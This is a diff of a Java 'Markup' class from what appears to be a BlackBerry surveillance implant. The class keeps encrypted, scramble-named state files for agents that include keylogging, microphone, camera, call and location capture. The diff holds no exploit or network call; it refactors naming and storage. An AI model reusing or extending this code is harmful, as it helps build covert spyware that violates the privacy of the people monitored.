@@ -9,10 +9,12 @@
 package blackberry.evidence;
 
 import java.io.IOException;
+import java.util.Date;
+import java.util.Enumeration;
 
 import net.rim.device.api.crypto.CryptoException;
+import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.NumberUtilities;
-import blackberry.agent.Agent;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Check;
@@ -21,8 +23,9 @@ import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
 import blackberry.fs.AutoFile;
 import blackberry.fs.Path;
+import blackberry.module.BaseModule;
+import blackberry.debug.Check;
 import blackberry.utils.Utils;
-
 
 /**
  * The Class Markup.
@@ -33,11 +36,56 @@ public class Markup {
     public static byte markupSeed;
     public static boolean markupInit;
 
-    private int agentId = 0;
+    private String markupId = "core";
 
     //#ifdef DEBUG
     private static Debug debug = new Debug("Markup", DebugLevel.VERBOSE);
     //#endif
+
+    Encryption encryption;
+    EvidenceCollector logCollector;
+
+    private Markup() {
+        encryption = new Encryption(Encryption.getKeys().getLogKey());
+        logCollector = EvidenceCollector.getInstance();
+    }
+
+    protected Markup(final String agentId_) {
+        this();
+        markupId = agentId_;
+    }
+
+    public Markup(final int id) {
+        this();
+        markupId = Integer.toString(id);
+    }
+
+    protected Markup(final String string, int num) {
+        this();
+        markupId = string + num;
+
+    }
+
+    public Markup(Event event) {
+        this("EVT" + event.getType(), event.getEventId());
+    }
+
+    public Markup(BaseModule module) {
+        this("AGN" + module.getType());
+    }
+
+    public Markup(Event module, int id) {
+        this("EVT" + module.getType(), id);
+    }
+
+    /**
+     * Crea un markup vuoto.
+     * 
+     * @return true if successful
+     */
+    public boolean createEmptyMarkup() {
+        return writeMarkup(null);
+    }
 
     /**
      * Override della funzione precedente: invece di generare il nome da una
@@ -59,64 +107,38 @@ public class Markup {
         debug.trace("makeMarkupName from: " + logName);
         //#endif
 
-        final String markupName = makeMarkupName(logName, addPath, false);
+        final String markupName = makeMarkupName(logName, addPath);
         return markupName;
     }
 
-    /**
-     * Genera un nome gia' scramblato per un file di Markup, se bAddPath e' TRUE
-     * il nome ritornato e' completo del path da utilizzare altrimenti viene
-     * ritornato soltanto il nome. Se la chiamata fallisce la funzione torna una
-     * stringa vuota. Il nome generato non indica necessariamente un file che
-     * gia' non esiste sul filesystem, e' compito del chiamante verificare che
-     * tale file non sia gia' presente. Se il parametro facoltativo bStoreToMMC
-     * e' impostato a TRUE viene generato un nome che punta alla prima MMC
-     * disponibile, se esiste.
-     * 
-     * @param markupName
-     *            the markup name
-     * @param addPath
-     *            the add path
-     * @param storeToMMC
-     *            the store to mmc
-     * @return the string
-     */
-    static String makeMarkupName(final String markupName,
-            final boolean addPath, final boolean storeToMMC) {
+    static String makeMarkupName(String agentId, final boolean addPath) {
+        // final String markupName = Integer.toHexString(agentId);
+        final String markupName = Utils.byteArrayToHex(Encryption.SHA1(agentId
+                .getBytes()));
         //#ifdef DBC
         Check.requires(markupName != null, "null markupName");
-        //#endif
-        //#ifdef DBC
-        Check.requires(markupName != "", "empty markupName");
+        Check.requires(markupName.length() > 0, "empty markupName");
         //#endif
 
-        String encName = "";
+        String encName = ""; //$NON-NLS-1$
 
         if (addPath) {
-            if (storeToMMC && Path.isSDAvailable()) {
-                encName = Path.SD() + Path.MARKUP_DIR;
-            } else {
-                encName = Path.USER() + Path.MARKUP_DIR;
-            }
+            encName = Path.markup();
         }
 
         encName += Encryption.encryptName(markupName + MARKUP_EXTENSION,
                 getMarkupSeed());
+
         //#ifdef DBC
-        Check.asserts(markupInit, "makeMarkupName: " + markupInit);
+        Check.asserts(markupInit, "makeMarkupName: " + markupInit); //$NON-NLS-1$
         //#endif
-
-        //#ifdef DEBUG
-        debug.trace("makeMarkupName: " + encName);
-        //#endif
-
         return encName;
     }
 
     private static int getMarkupSeed() {
         if (!markupInit) {
             final Keys keys = Encryption.getKeys();
-            final byte[] challengeKey = keys.getChallengeKey();
+            final byte[] challengeKey = keys.getProtoKey();
             //#ifdef DBC
             Check.asserts(challengeKey != null,
                     "makeMarkupName: challengeKey==null");
@@ -128,104 +150,24 @@ public class Markup {
         return markupSeed;
     }
 
-    /**
-     * Rimuove il file di markup relativo all'agente uAgentId. La funzione torna
-     * TRUE se il file e' stato rimosso o non e' stato trovato, FALSE se non e'
-     * stato possibile rimuoverlo.
-     * 
-     * @param agentId_
-     *            the agent id_
-     */
+    public static synchronized int removeMarkups() {
 
-    public static synchronized void removeMarkup(final int agentId_) {
-        //#ifdef DBC
-        Check.requires(agentId_ > 0, "agentId null");
+        //#ifdef DEBUG
+        debug.trace("removeMarkups");
         //#endif
+        
+        int numDeleted = 0;
 
-        final String markupName = makeMarkupName(agentId_, true);
-        //#ifdef DBC
-        Check.asserts(markupName != "", "markupName empty");
-        //#endif
+        AutoFile dir = new AutoFile(Path.markup());
+        Enumeration list = dir.list();
+        for (Enumeration iterator = list; iterator.hasMoreElements();) {
+            String filename = (String) iterator.nextElement();
+            AutoFile file = new AutoFile(Path.markup(), filename);
+            file.delete();
+            numDeleted++;
+        }
 
-        final AutoFile file = new AutoFile(markupName, true);
-        file.delete();
-    }
-
-    /**
-     * Rimuove tutti i file di markup presenti sul filesystem.
-     */
-
-    public static synchronized void removeMarkups() {
-        removeMarkup(Agent.AGENT_MESSAGE);
-        removeMarkup(Agent.AGENT_TASK);
-        removeMarkup(Agent.AGENT_CALLLIST);
-        removeMarkup(Agent.AGENT_DEVICE);
-        removeMarkup(Agent.AGENT_POSITION);
-        removeMarkup(Agent.AGENT_CALL);
-        removeMarkup(Agent.AGENT_CALL_LOCAL);
-        removeMarkup(Agent.AGENT_KEYLOG);
-        removeMarkup(Agent.AGENT_SNAPSHOT);
-        removeMarkup(Agent.AGENT_URL);
-        removeMarkup(Agent.AGENT_IM);
-        removeMarkup(Agent.AGENT_MIC);
-        removeMarkup(Agent.AGENT_CAM);
-        removeMarkup(Agent.AGENT_CLIPBOARD);
-        removeMarkup(Agent.AGENT_APPLICATION);
-        removeMarkup(Agent.AGENT_CRISIS);
-
-        removeMarkup(Event.EVENT_TIMER);
-        removeMarkup(Event.EVENT_SMS);
-        removeMarkup(Event.EVENT_CALL);
-        removeMarkup(Event.EVENT_CONNECTION);
-        removeMarkup(Event.EVENT_PROCESS);
-        removeMarkup(Event.EVENT_QUOTA);
-        removeMarkup(Event.EVENT_SIM_CHANGE);
-        removeMarkup(Event.EVENT_AC);
-        removeMarkup(Event.EVENT_BATTERY);
-        removeMarkup(Event.EVENT_CELLID);
-        removeMarkup(Event.EVENT_LOCATION);
-    }
-
-    String lognName;
-
-    AutoFile file;
-
-    Encryption encryption;
-
-    EvidenceCollector logCollector;
-
-    private Markup() {
-        logCollector = EvidenceCollector.getInstance();
-        encryption = new Encryption();
-
-    }
-
-    /**
-     * Instantiates a new markup.
-     * 
-     * @param agentId_
-     *            the agent id_
-     * @param aesKey
-     *            the aes key
-     */
-    public Markup(final int agentId_, final byte[] aesKey) {
-        this();
-        final byte[] key = new byte[16];
-        Utils.copy(key, 0, aesKey, 0, 16);
-
-        encryption.makeKey(key);
-        agentId = agentId_;
-
-        getMarkupSeed();
-    }
-
-    /**
-     * Crea un markup vuoto.
-     * 
-     * @return true if successful
-     */
-    public boolean createEmptyMarkup() {
-        return writeMarkup(null);
+        return numDeleted;
     }
 
     /**
@@ -235,16 +177,15 @@ public class Markup {
      */
     public synchronized boolean isMarkup() {
         //#ifdef DBC
-        Check.requires(agentId > 0, "agentId null");
+        Check.requires(markupId != null, "markupId null");
         //#endif
 
-        final String markupName = makeMarkupName(agentId, true);
+        final String markupName = makeMarkupName(markupId, true);
         //#ifdef DBC
         Check.asserts(markupName != "", "markupName empty");
         //#endif
 
         final AutoFile fileRet = new AutoFile(markupName, true);
-
         return fileRet.exists();
     }
 
@@ -262,10 +203,10 @@ public class Markup {
      */
     public synchronized byte[] readMarkup() throws IOException {
         //#ifdef DBC
-        Check.requires(agentId > 0, "agentId null");
+        Check.requires(markupId != null, "markupId null");
         //#endif
 
-        final String markupName = makeMarkupName(agentId, true);
+        final String markupName = makeMarkupName(markupId, true);
         //#ifdef DBC
         Check.asserts(markupName != "", "markupName empty");
         //#endif
@@ -276,7 +217,7 @@ public class Markup {
             final byte[] encData = fileRet.read();
             final int len = Utils.byteArrayToInt(encData, 0);
 
-            byte[] plain=null;
+            byte[] plain = null;
             try {
                 plain = encryption.decryptData(encData, len, 4);
             } catch (CryptoException e) {
@@ -307,10 +248,10 @@ public class Markup {
         debug.trace("removeMarkup: ");
         //#endif
         //#ifdef DBC
-        Check.requires(agentId > 0, "agentId null");
+        Check.requires(markupId != null, "markupId null");
         //#endif
 
-        final String markupName = makeMarkupName(agentId, true);
+        final String markupName = makeMarkupName(markupId, true);
         //#ifdef DBC
         Check.asserts(markupName != "", "markupName empty");
         //#endif
@@ -335,7 +276,7 @@ public class Markup {
      * @return true, if successful
      */
     public synchronized boolean writeMarkup(final byte[] data) {
-        final String markupName = makeMarkupName(agentId, true);
+        final String markupName = makeMarkupName(markupId, true);
         //#ifdef DBC
         Check.asserts(markupName != "", "markupName empty");
         //#endif
@@ -355,6 +296,31 @@ public class Markup {
         }
 
         return true;
+    }
+
+    public Date readDate() {
+        byte[] data;
+        Date date = null;
+        try {
+            data = readMarkup();
+
+            DataBuffer buffer = new DataBuffer(data, 0, data.length, true);
+            long time = buffer.readLong();
+            date = new Date(time);
+        } catch (IOException e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error("readDate");
+            //#endif
+        }
+        return date;
+    }
+
+    public void write(Date date) {
+        DataBuffer buffer = new DataBuffer();
+        buffer.writeLong(date.getTime());
+        writeMarkup(buffer.getArray());
+
     }
 
 }
